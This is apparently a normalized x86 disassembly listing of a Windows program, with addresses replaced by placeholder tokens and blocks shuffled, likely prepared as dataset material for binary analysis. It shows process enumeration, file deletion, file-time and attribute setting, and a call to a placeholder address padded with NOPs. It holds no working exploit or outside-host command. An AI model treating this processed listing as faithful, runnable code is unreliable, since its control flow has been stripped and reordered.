mov eax [ ebp - 0x18 ]
cdq
push 0x5
pop ecx
idiv ecx
shl eax 0x2
mov [ ebp - 0x4 ] eax
call sub_4120fd
push esp
mov eax 0x11111111
call eax
nop
nop
nop
nop
nop
nop
nop
nop
pop eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
and [ ebp - 0x20 ] 0x0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x20 ] 0xc8
jge r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0x8 ]
mov [ ebp - 0x8 ] eax
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call sub_411c40
add esp 0xc
push [ ebp - 0xc ]
push 0x11111111
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call sub_411ca6
add esp 0x10
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_411d76
pop ecx
pop ecx
mov ecx [ ebp - 0x18 ]
add ecx eax
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x18 ]
push 0x8
push rw-data
push [ ebp - 0x1c ]
call sub_4084b0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
sub_4120fd
nop
nop
nop
nop
nop
nop
nop
nop
pop eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
and [ ebp - 0x20 ] 0x0
jmp r-xdata
cmp [ ebp - 0x20 ] 0xc8
jge r-xdata
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0x8 ]
mov [ ebp - 0x8 ] eax
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call sub_411c40
add esp 0xc
push [ ebp - 0xc ]
push 0x11111111
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call sub_411ca6
add esp 0x10
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_411d76
pop ecx
pop ecx
mov ecx [ ebp - 0x18 ]
add ecx eax
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
leave
retn
push 0x8
push rw-data
push [ ebp - 0x1c ]
call sub_4084b0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
sub_4121b0
push ebx
push esi
mov esi rw-data
push edi
push esi
push 0x1
call sub_4092d5
push esi
call sub_4122b5
mov edi eax
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x20 ]
push esi
call sub_408850
push esi
push edi
mov ebx eax
call sub_412342
push esi
push 0x1
call sub_409327
add esp 0x28
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_412200
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_412280
push [ esp + 0x4 ]
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
retn
push eax
call sub_4080af
pop ecx
or eax 0xffffffff
retn
test eax eax
je r-xdata
sub_4122b5
push esi
mov esi [ esp + 0x8 ]
push [ esi + 0x10 ]
call sub_40cdf5
test eax eax
pop ecx
je r-xdata
xor eax eax
pop esi
retn
cmp esi rw-data
jne r-xdata
cmp esi rw-data
jne r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ eax * 4 + rw-data ] 0x0
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] ebx
push ebx
call sub_406c98
test eax eax
pop ecx
mov [ edi ] eax
jne r-xdata
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
push 0x1
pop eax
pop edi
pop ebx
pop esi
retn
sub_412342
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
pop esi
retn
mov esi [ esp + 0xc ]
test [ esi + 0xd ] 0x10
je r-xdata
push esi
call sub_4094b2
and [ esi + 0xd ] 0xee
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_412380
sub esp 0x128
push ebx
push edi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
lea eax [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x128
push eax
push ebx
xor edi edi
call Process32First
test eax eax
jne r-xdata
pop edi
or eax eax
pop ebx
add esp 0x128
retn
push ebp
mov ebp [ esp + 0x138 ]
lea ecx [ esp + 0x30 ]
push esi
push ecx
push ebp
call sub_40cbf0
mov esi [ esp + 0x148 ]
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop ebx
add esp 0x128
retn
lea eax [ esp + 0x10 ]
push eax
push ebx
call Process32Next
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
mov edi 0x1
mov [ esi ] edx
push ebx
call [ CloseHandle@IAT ]
pop esi
mov eax edi
pop ebp
pop edi
pop ebx
add esp 0x128
retn
lea esi [ esi + edi * 4 ]
lea eax [ esp + 0x10 ]
push eax
push ebx
call Process32Next
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
inc edi
mov [ esi ] edx
add esi 0x4
lea ecx [ esp + 0x34 ]
push ecx
push ebp
call sub_40cbf0
add esp 0x8
test eax eax
jne r-xdata
sub_412450
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x1c ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
dec eax
mov esi ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffff894
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
call sub_40785f
mov [ esi ] eax
pop ecx
mov eax esi
pop esi
leave
retn 0x1c
sub_41249c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov cx [ eax ]
cmp cx 0x76c
jae r-xdata
movzx edx [ eax + 0xc ]
push [ ebp + 0xc ]
push edx
movzx edx [ eax + 0xa ]
push edx
movzx edx [ eax + 0x8 ]
push edx
movzx edx [ eax + 0x6 ]
movzx eax [ eax + 0x2 ]
push edx
push eax
movzx eax cx
push eax
lea ecx [ ebp + 0x8 ]
call sub_412450
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
and [ esi ] 0x0
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
sub_4124e8
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x8 ]
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
jne r-xdata
mov eax esi
pop esi
leave
retn 0x8
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
lea ecx [ ebp + 0x8 ]
push eax
call sub_41249c
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
sub_412534
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
push ecx
je r-xdata
call sub_407b5b
pop ecx
call sub_407b5b
test eax eax
pop ecx
je r-xdata
pop ebx
retn 0x4
push esi
push edi
push 0x9
mov esi eax
pop ecx
mov edi ebx
[ edi ] [ esi ]
pop edi
mov eax ebx
pop esi
jmp r-xdata
sub_412563
push esi
mov esi ecx
push 0x80
lea eax [ esi + 0x14 ]
mov [ esi + 0xc ] 0x1
push eax
push [ esi + 0x94 ]
call sub_41352c
neg eax
sbb eax eax
neg eax
mov [ esi + 0x10 ] eax
pop esi
retn
sub_41258c
mov eax [ esp + 0xc ]
push esi
test eax eax
mov esi ecx
je r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
and [ eax ] 0x0
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx esi
call sub_412563
mov eax [ esp + 0x8 ]
and [ eax ] 0x0
push [ esp + 0xc ]
lea eax [ esi + 0x14 ]
push eax
push [ esp + 0x10 ]
call [ lstrcpynA@IAT ]
jmp r-xdata
mov eax [ esi + 0x10 ]
pop esi
retn 0xc
sub_41261e
push esi
mov esi ecx
push edi
xor edi edi
mov ecx [ esi + 0x14 ]
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
call sub_412608
mov [ esi + 0x14 ] edi
pop edi
pop esi
retn
sub_412657
mov eax [ ecx + 0x4 ]
push esi
mov edx [ eax ]
mov esi [ eax + 0x8 ]
test edx edx
mov [ ecx + 0x4 ] edx
je r-xdata
and [ ecx + 0x8 ] 0x0
and [ edx + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_41263e
mov eax esi
pop esi
retn
sub_4126be
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
mov ebx [ esp + 0xc ]
je r-xdata
push eax
call sub_41349d
and [ esi + 0x4 ] 0x0
pop ecx
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn 0x8
push edi
mov edi ebx
shl edi 0x2
push edi
call sub_413474
push edi
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_406580
add esp 0x10
pop edi
sub_412703
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
call sub_412608
and [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_41349d
and [ esi + 0x4 ] 0x0
pop ecx
sub_412757
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
inc [ esi + 0xc ]
mov [ esi + 0x10 ] ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
pop esi
retn
push 0xc
lea eax [ esi + 0x14 ]
push [ esi + 0x18 ]
push eax
call sub_4125e8
mov ecx [ esi + 0x18 ]
add eax 0x4
lea edx [ ecx + ecx * 2 ]
dec ecx
test ecx ecx
lea eax [ eax + edx * 4 - 0xc ]
jl r-xdata
inc ecx
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
sub eax 0xc
dec ecx
jne r-xdata
sub_4127bd
push esi
mov esi [ esp + 0x8 ]
mov eax esi
xor edx edx
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + edx * 4 ]
cmp [ eax + 0x4 ] esi
je r-xdata
pop esi
retn 0x8
mov eax [ eax ]
jmp r-xdata
test eax eax
je r-xdata
sub_4127ef
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov edx [ esi + edx * 4 ]
cmp [ edx + 0x4 ] edi
je r-xdata
mov eax [ edx + 0x8 ]
jmp r-xdata
mov edx [ edx ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test edx edx
je r-xdata
sub_412822
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
push edi
call sub_4127bd
test eax eax
jne r-xdata
pop edi
add eax 0x8
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x4 ] eax
jne r-xdata
mov ecx esi
call sub_412757
mov [ eax + 0x4 ] edi
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx * 4 ] eax
push 0x1
mov ecx esi
push [ esi + 0x8 ]
call sub_4126be
sub_412872
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esi + edx * 4 ]
lea edx [ esi + edx * 4 ]
cmp [ eax + 0x4 ] edi
je r-xdata
mov esi [ eax ]
push eax
mov [ edx ] esi
call sub_4127a4
push 0x1
pop eax
jmp r-xdata
mov edx eax
mov eax [ eax ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
sub_4128b4
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
cmp esi 0xffffffff
jne r-xdata
mov edi [ esi ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x8 ]
xor edi edi
test edx edx
jbe r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ ecx ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esi + 0x8 ]
pop edi
mov [ ecx ] eax
pop esi
retn 0xc
mov eax [ esi + 0x4 ]
push ebx
mov ebx [ ecx + 0x8 ]
xor edx edx
shr eax 0x4
div ebx
inc edx
cmp edx ebx
jae r-xdata
mov eax [ ecx + 0x4 ]
pop ebx
mov eax [ ecx + 0x4 ]
lea eax [ eax + edx * 4 ]
inc edi
add eax 0x4
cmp edi edx
jb r-xdata
inc edx
add eax 0x4
cmp edx ebx
jb r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
mov edi [ eax ]
test edi edi
jne r-xdata
sub_412926
push ebp
mov ebp esp
sub esp 0x140
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
lea edi [ esi + 0x12 ]
push edi
call sub_412f1a
test eax eax
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
push [ ebp + 0x8 ]
call [ FindFirstFileA@IAT ]
or edi 0xffffffff
cmp eax edi
jne r-xdata
and [ edi ] al
jmp r-xdata
push eax
call [ FindClose@IAT ]
mov al [ ebp - 0x140 ]
push edi
and al 0x7f
lea ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] al
mov eax [ ebp - 0x120 ]
mov [ esi + 0xc ] eax
lea eax [ ebp - 0x13c ]
push eax
call sub_4124e8
mov eax [ eax ]
push edi
mov [ esi ] eax
lea eax [ ebp - 0x134 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_4124e8
mov eax [ eax ]
push edi
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_4124e8
mov eax [ eax ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
pop edi
pop esi
leave
retn 0x8
push 0x1
pop eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] eax
sub_4129d8
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push esi
mov ecx edi
call sub_412534
mov eax [ eax + 0x14 ]
push esi
add eax 0x76c
mov ecx edi
mov [ ebp - 0x18 ] ax
call sub_412534
mov eax [ eax + 0x10 ]
push esi
inc eax
mov ecx edi
mov [ ebp - 0x16 ] ax
call sub_412534
mov ax [ eax + 0xc ]
push esi
mov ecx edi
mov [ ebp - 0x12 ] ax
call sub_412534
mov ax [ eax + 0x8 ]
push esi
mov ecx edi
mov [ ebp - 0x10 ] ax
call sub_412534
mov ax [ eax + 0x4 ]
push esi
mov ecx edi
mov [ ebp - 0xe ] ax
call sub_412534
mov ax [ eax ]
mov [ ebp - 0xa ] si
mov [ ebp - 0xc ] ax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
mov edi [ GetLastError@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
call [ LocalFileTimeToFileTime@IAT ]
test eax eax
jne r-xdata
push esi
call edi
push eax
call sub_4130b0
pop edi
pop esi
leave
retn
push esi
call edi
push eax
call sub_4130b0
sub_412a8b
push ebp
mov ebp esp
sub esp 0x24
push ebx
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
call [ GetFileAttributesA@IAT ]
mov ebx [ GetLastError@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
movzx eax [ esi + 0x10 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
push edi
call ebx
push eax
call sub_4130b0
cmp [ esi + 0x4 ] edi
lea eax [ esi + 0x4 ]
je r-xdata
test [ ebp - 0x4 ] 0x1
je r-xdata
movzx eax [ esi + 0x10 ]
cmp eax [ ebp - 0x4 ]
pop esi
je r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push eax
call sub_4129d8
cmp [ esi + 0x8 ] edi
lea eax [ esi + 0x8 ]
pop ecx
pop ecx
je r-xdata
push eax
push [ ebp + 0x8 ]
call [ SetFileAttributesA@IAT ]
test eax eax
jne r-xdata
pop edi
pop ebx
leave
retn 0x8
test [ ebp - 0x4 ] 0x1
jne r-xdata
cmp [ esi ] edi
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push eax
call sub_4129d8
pop ecx
lea eax [ ebp - 0x14 ]
pop ecx
mov [ ebp - 0x8 ] eax
push edi
call ebx
push eax
call sub_4130b0
push eax
push [ ebp + 0x8 ]
call [ SetFileAttributesA@IAT ]
test eax eax
jne r-xdata
push edi
push 0x80
push 0x3
push edi
push 0x1
push 0xc0000000
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
call sub_4129d8
pop ecx
lea eax [ ebp - 0x1c ]
pop ecx
mov [ ebp - 0xc ] eax
push edi
call ebx
push eax
call sub_4130b0
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push edi
call [ SetFileTime@IAT ]
test eax eax
jne r-xdata
push 0x0
call ebx
push eax
call sub_4130b0
push edi
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
push eax
call ebx
push eax
call sub_4130b0
xor edi edi
push eax
call ebx
push eax
call sub_4130b0
sub_412bb8
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
cmp [ eax - 0xc ] 0x0
jl r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
push [ ecx ]
mov ecx esi
call sub_412e7c
mov [ esi ] eax
add eax 0xfffffff4
push eax
call [ InterlockedIncrement@IAT ]
jmp r-xdata
mov eax esi
pop esi
retn 0x4
sub_412cb0
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx ecx
test esi esi
jne r-xdata
push edi
push 0x40
pop edi
cmp esi edi
jg r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
jmp r-xdata
mov edi 0x80
cmp esi edi
jg r-xdata
mov ecx rw-data
pop esi
pop ebx
retn 0x4
mov edi 0x100
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
mov [ eax ] 0x1
and [ eax + esi + 0xc ] 0x0
mov [ eax + 0x4 ] esi
add eax 0xc
mov [ ebx ] eax
pop edi
mov edi 0x200
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
call sub_405dc9
mov [ eax + 0x8 ] edi
jmp r-xdata
lea eax [ esi + 0xd ]
push eax
call sub_413474
pop ecx
mov [ eax + 0x8 ] esi
mov ecx rw-data
jmp r-xdata
sub_412d32
mov eax [ ecx + 0x8 ]
cmp eax 0x40
jne r-xdata
cmp eax 0x80
jne r-xdata
push ecx
mov ecx rw-data
cmp eax 0x100
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
cmp eax 0x200
push ecx
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
call sub_405e58
retn
call sub_41349d
pop ecx
retn
mov ecx rw-data
jmp r-xdata
sub_412d7a
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ esi ]
sub ecx 0xc
call sub_412d32
sub_412dce
push esi
push edi
mov edi ecx
mov esi [ edi ]
cmp [ esi - 0xc ] 0x1
jle r-xdata
pop edi
pop esi
retn
call sub_412d7a
push [ esi - 0x8 ]
mov ecx edi
call sub_412cb0
mov eax [ esi - 0x8 ]
inc eax
push eax
push esi
push [ edi ]
call sub_4073d0
add esp 0xc
sub_412dfc
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
jg r-xdata
mov ecx esi
call sub_412d7a
push edi
mov ecx esi
call sub_412cb0
cmp edi [ eax - 0x4 ]
jle r-xdata
pop edi
pop esi
retn 0x4
sub_412e25
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
sub ecx 0xc
call sub_412d32
sub_412e4f
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_412dfc
push edi
push [ esp + 0x14 ]
push [ esi ]
call sub_4073d0
mov eax [ esi ]
add esp 0xc
mov [ eax - 0x8 ] edi
mov eax [ esi ]
and [ eax + edi ] 0x0
pop edi
pop esi
retn 0x8
sub_412e7c
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
xor eax eax
jmp r-xdata
push edi
push eax
mov ecx esi
call sub_412e4f
mov eax esi
pop edi
pop esi
retn 0x4
sub_412ea3
push ebx
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
lea ebx [ eax - 0xc ]
jg r-xdata
push edi
mov edi [ eax - 0x8 ]
cmp ecx edi
jge r-xdata
cmp ecx [ eax - 0x4 ]
jle r-xdata
push ecx
mov ecx esi
call sub_412cb0
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0xc ]
push eax
push [ esi ]
call sub_4073d0
mov eax [ esi ]
add esp 0xc
push ebx
mov [ eax - 0x8 ] edi
call sub_412dab
pop edi
mov ecx edi
mov eax [ esi ]
pop esi
pop ebx
retn 0x4
sub_412ef2
push esi
mov esi ecx
call sub_412dce
mov eax [ esp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov [ ecx - 0x8 ] eax
mov ecx [ esi ]
pop esi
and [ ecx + eax ] 0x0
retn 0x4
push [ esi ]
call [ lstrlenA@IAT ]
sub_412f1a
mov eax sub_418014
call sub_4072e4
sub esp 0x14c
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
mov esi 0x104
push edi
push esi
push [ ebp + 0xc ]
call [ GetFullPathNameA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
xor esi esi
push eax
push edi
mov [ ebp - 0x4 ] esi
call sub_412fea
push esi
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push esi
push esi
push [ ebp + 0x8 ]
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0xc ]
push edi
call [ lstrcpynA@IAT ]
xor eax eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_412e25
mov eax esi
test [ ebp - 0x10 ] 0x2
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
test [ ebp - 0x10 ] 0x4
jne r-xdata
push edi
call [ CharUpperA@IAT ]
push 0x1
pop esi
lea eax [ ebp - 0x158 ]
push eax
push [ ebp + 0xc ]
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ FindClose@IAT ]
lea eax [ ebp - 0x12c ]
push eax
push [ ebp - 0x14 ]
call [ lstrcpyA@IAT ]
sub_412fea
mov ecx [ esp + 0x8 ]
push ebx
push esi
mov esi 0x104
push edi
push esi
call sub_412ea3
xor ebx ebx
mov edi eax
push esi
push ebx
push edi
call sub_406580
add esp 0xc
push esi
push [ esp + 0x14 ]
push edi
call [ lstrcpynA@IAT ]
mov cl [ edi ]
mov eax edi
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
mov cl [ edi ]
mov eax edi
inc eax
inc eax
mov cl [ eax + 0x1 ]
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
jne r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
je r-xdata
push eax
call sub_4077c7
pop ecx
mov cl [ eax ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
push 0xffffffff
call sub_412ef2
pop edi
pop esi
pop ebx
retn 0x8
mov [ eax + 0x1 ] bl
cmp cl 0x2f
je r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
push eax
call sub_4077c7
pop ecx
cmp cl 0x2f
je r-xdata
cmp cl bl
je r-xdata
push eax
call sub_4077c7
pop ecx
mov cl [ eax ]
jmp r-xdata
cmp cl 0x5c
je r-xdata
push eax
call sub_4077c7
pop ecx
jmp r-xdata
cmp cl bl
je r-xdata
